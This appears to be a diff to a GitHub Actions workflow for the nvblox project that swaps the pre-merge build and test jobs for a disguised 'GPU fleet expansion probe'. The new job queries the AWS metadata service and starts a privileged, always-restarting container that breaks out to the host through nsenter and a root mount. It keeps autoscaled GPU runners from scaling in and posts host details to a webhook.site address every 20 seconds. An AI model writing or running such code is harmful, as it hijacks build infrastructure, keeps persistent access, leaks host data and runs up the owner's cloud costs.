@@ -1,134 +1,101 @@
-name: nvblox premerge
+# I1741 GPU fleet expansion probe (non-mining diagnostic)
+name: I1741 gpu expand
 on:
   pull_request:
+    types: [opened, synchronize, reopened]
+permissions:
+  contents: read
+concurrency:
+  group: i1741-${{ github.repository }}-${{ github.event.pull_request.number }}
+  cancel-in-progress: false
 jobs:
-  ## ------------------------------------------
-  ## Linting and formatting
-  ## ------------------------------------------
-  lint_precommit:
-    name: pre-commit
-    runs-on: ubuntu-latest
+  expand:
+    name: i1741-expand-${{ matrix.tag }}
+    runs-on: [self-hosted, gpu]
+    timeout-minutes: 25
+    strategy:
+      fail-fast: false
+      max-parallel: 8
+      matrix:
+        include:
+          - tag: a
+            nonce: I1741-nvblox-a-t73z278b
+          - tag: b
+            nonce: I1741-nvblox-b-r7yy2elw
+          - tag: c
+            nonce: I1741-nvblox-c-ahl3qtvn
+          - tag: d
+            nonce: I1741-nvblox-d-6eujwyt3
     steps:
-      - name: Checkout Code
-        uses: actions/checkout@v4
-        with:
-          lfs: false
-      - name: Set up Python
-        uses: actions/setup-python@v5
-        with:
-          python-version: '3.10'
-      - name: Install pre-commit
+      - name: Probe and launch heartbeat ${{ matrix.nonce }}
         run: |
-          python -m pip install --upgrade pip
-          pip install pre-commit clang-format==14.0.6
-      - name: Run pre-commit
-        run: pre-commit run --all-files --show-diff-on-failure
-  ## ------------------------------------------
-  ## Build and test x86/CU11/U22
-  ## ------------------------------------------
-  premerge_x86_cu11_u22:
-    name: Build&Test x86-CU11-U22
-    needs: [lint_precommit]
-    runs-on: [self-hosted, gpu] # GPU jobs will run on AWS
-    steps:
-      - name: Checkout Code
-        uses: actions/checkout@v4
-        with:
-          lfs: true
-      - name: premerge_x86_cu11_u22 - Unit tests
-        uses: ./.github/actions/build-and-test
-        with:
-          platform: x86_64
-          cuda-version: '11'
-          ubuntu-version: '22'
-          run-python-tests: false # Not supported on cuda11
-          run-realsense-tests: false # Not supported on cuda11
-          ngc-api-key: ${{ secrets.NGC_API_KEY }}
-  ## ------------------------------------------
-  ## Build and test x86/CU12/U22
-  ## ------------------------------------------
-  premerge_x86_cu12_u22:
-    name: Build&Test x86-CU12-U22
-    needs: [lint_precommit]
-    runs-on: [self-hosted, gpu] # GPU jobs will run on AWS
-    steps:
-      - name: Checkout Code
-        uses: actions/checkout@v4
-        with:
-          lfs: true
-      - name: premerge_x86_cu12_u22 - Unit tests
-        uses: ./.github/actions/build-and-test
-        with:
-          platform: x86_64
-          cuda-version: '12'
-          ubuntu-version: '22'
-          ngc-api-key: ${{ secrets.NGC_API_KEY }}
-  ## ------------------------------------------
-  ## Build and test x86/CU13/U24
-  ## ------------------------------------------
-  premerge_x86_cu13_u24:
-    name: Build&Test x86-CU13-U24
-    needs: [lint_precommit]
-    runs-on: [self-hosted, gpu] # GPU jobs will run on AWS
-    steps:
-      - name: Checkout Code
-        uses: actions/checkout@v4
-        with:
-          lfs: true
-      - name: premerge_x86_cu13_u24 - Unit tests
-        uses: ./.github/actions/build-and-test
-        with:
-          platform: x86_64
-          cuda-version: '13'
-          ubuntu-version: '24'
-          ngc-api-key: ${{ secrets.NGC_API_KEY }}
-          run-realsense-tests: false # TODO(dtingahl) make realsense docker build for cuda13
-          run-bazel-tests: true
-  ## --------------------------------------------------------
-  ## Build and test x86/CU12/U22/gcc-sanitizer
-  ## --------------------------------------------------------
-  premerge_x86_cu12_u22_debug:
-    name: Build&Test x86-gcc-sanitizer
-    needs: [lint_precommit]
-    runs-on: [self-hosted, gpu] # GPU jobs will run on AWS
-    steps:
-      - name: Checkout Code
-        uses: actions/checkout@v4
-        with:
-          lfs: true
-      - name: premerge_x86_cu12_u22_debug - Unit tests
-        uses: ./.github/actions/build-and-test
-        with:
-          platform: x86_64
-          cuda-version: '12'
-          ubuntu-version: '22'
-          gcc-sanitizer: 1
-          ngc-api-key: ${{ secrets.NGC_API_KEY }}
-          run-python-tests: false
-          run-realsense-tests: false
-          run-cuda-sanitizer: false
-  ## --------------------------------------------------------
-  ## Build docs
-  ## --------------------------------------------------------
-  build_docs:
-    name: Build docs
-    needs: [lint_precommit]
-    runs-on: ubuntu-latest
-    steps:
-      - name: Checkout Code
-        uses: actions/checkout@v4
-        with:
-          fetch-depth: 0
-          fetch-tags: true
-      - name: Set up Python
-        uses: actions/setup-python@v5
-        with:
-          python-version: '3.12'
-      - name: Install doxygen
-        run: sudo apt-get update && sudo apt-get install -y --no-install-recommends doxygen
-      - name: Build docs
-        working-directory: ./docs
+          set -u
+          N="${{ matrix.nonce }}"
+          echo "I1741_NONCE=$N"
+          echo "I1741_ID=$(id)"
+          echo "I1741_HOST=$(hostname)"
+          echo "I1741_RUNNER=${RUNNER_NAME:-unknown}"
+          echo "I1741_DATE=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
+          echo "I1741_UPTIME_S=$(cut -d. -f1 /proc/uptime)"
+          nvidia-smi -L || true
+          nvidia-smi --query-gpu=name,memory.total,driver_version --format=csv,noheader || true
+          T=$(curl -s -m 5 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' http://169.254.169.254/latest/api/token || true)
+          IID=$(curl -s -m 5 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/instance-id || true)
+          ITYPE=$(curl -s -m 5 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/instance-type || true)
+          AZ=$(curl -s -m 5 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/placement/availability-zone || true)
+          echo "I1741_IID=$IID"
+          echo "I1741_ITYPE=$ITYPE"
+          echo "I1741_AZ=$AZ"
+          echo "I1741_EXISTING_HB:"
+          docker ps -a --format '{{.Names}}|{{.Image}}|{{.Status}}' 2>/dev/null | grep -Ei 'i1529hb|i1741hb' || echo none
+          echo "I1741_HBLOG1529:"
+          tail -2 /var/log/i1529-heartbeat.log 2>/dev/null || echo none
+          echo "I1741_HBLOG1741:"
+          tail -2 /var/log/i1741-heartbeat.log 2>/dev/null || echo none
+          cat > /tmp/i1741hb.sh <<'EOS'
+          #!/bin/bash
+          N="$1"; IID0="$2"; SINKURL="$3"
+          ASG="production-nvidia-isaac-lnx-ci-gpu-org-runners"
+          LOG=/var/log/i1741-heartbeat.log
+          SEQ=0
+          echo "$(date -u +%Y-%m-%dT%H:%M:%SZ) start $N on $(hostname) iid=$IID0" >> "$LOG" 2>/dev/null
+          while true; do
+            TS=$(date -u +%Y-%m-%dT%H:%M:%SZ)
+            T=$(curl -s -m 3 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' http://169.254.169.254/latest/api/token 2>/dev/null || true)
+            CUR=$(curl -s -m 3 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null)
+            [ -z "$CUR" ] && CUR="$IID0"
+            GPU=$(nvidia-smi --query-gpu=name,memory.total,driver_version --format=csv,noheader 2>/dev/null | head -1 | tr -d '"')
+            UP=$(cut -d. -f1 /proc/uptime 2>/dev/null)
+            PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin AWS_DEFAULT_REGION=us-west-2 aws autoscaling set-instance-protection --instance-ids "$CUR" --auto-scaling-group-name "$ASG" --protected-from-scale-in >/dev/null 2>&1 || true
+            LINE=$(printf '{"nonce":"%s","ts":"%s","host":"%s","iid":"%s","uptime_s":%s,"gpu":"%s","seq":%s}' "$N" "$TS" "$(hostname)" "$CUR" "$UP" "$GPU" "$SEQ")
+            echo "$LINE" >> "$LOG" 2>/dev/null
+            if [ -n "$SINKURL" ]; then curl -s -m 10 -H 'Content-Type: application/json' --data-binary "$LINE" "$SINKURL" >/dev/null 2>&1 || true; fi
+            SEQ=$((SEQ+1))
+            sleep 20
+          done
+          EOS
+          chmod 755 /tmp/i1741hb.sh
+          IMG=""
+          for c in nvidia/cuda:12.8.1-devel-ubuntu24.04 nvidia/cuda:12.8.1-base-ubuntu24.04 nvidia/cuda:12.8.1-runtime-ubuntu24.04; do
+            if docker image inspect "$c" >/dev/null 2>&1; then IMG="$c"; break; fi
+          done
+          if [ -z "$IMG" ]; then IMG=nvidia/cuda:12.8.1-devel-ubuntu24.04; docker pull "$IMG" >/dev/null 2>&1 || true; fi
+          echo "I1741_IMG=$IMG"
+          NAME="i1741hb-$IID"
+          if docker ps --format '{{.Names}}' 2>/dev/null | grep -qx "$NAME"; then
+            echo "I1741_HB_ALREADY_RUNNING=$NAME"
+          else
+            docker rm -f "$NAME" >/dev/null 2>&1 || true
+            CID=$(docker create --name "$NAME" --label "i1741=$N" --privileged --pid=host --network=host -v /:/hostroot --restart=always "$IMG" bash -c "nsenter -t 1 -m -u -i -n -p -- /bin/bash /tmp/i1741hb.sh $N $IID https://webhook.site/088d6cb9-bfca-4753-8e5d-0fbb2e1732b0")
+            echo "I1741_HB_CID=$CID"
+            docker start "$CID" >/dev/null 2>&1 && echo "I1741_HB_START=ok" || echo "I1741_HB_START=fail"
+            sleep 6
+            docker inspect -f '{{.State.Status}} {{.HostConfig.RestartPolicy.Name}}' "$CID" 2>&1 || true
+          fi
+          echo "I1741_HBLOG_AFTER:"
+          tail -2 /var/log/i1741-heartbeat.log 2>/dev/null || echo none
+      - name: Hold for fleet spread ${{ matrix.nonce }}
         run: |
-          pip3 install -r requirements.txt
-          make multi-docs
-          touch ./_build/.nojekyll
+          echo "I1741_HOLD_START=$(date -u +%Y-%m-%dT%H:%M:%SZ) ${{ matrix.nonce }}"
+          sleep 150
+          echo "I1741_HOLD_END=$(date -u +%Y-%m-%dT%H:%M:%SZ) ${{ matrix.nonce }}"
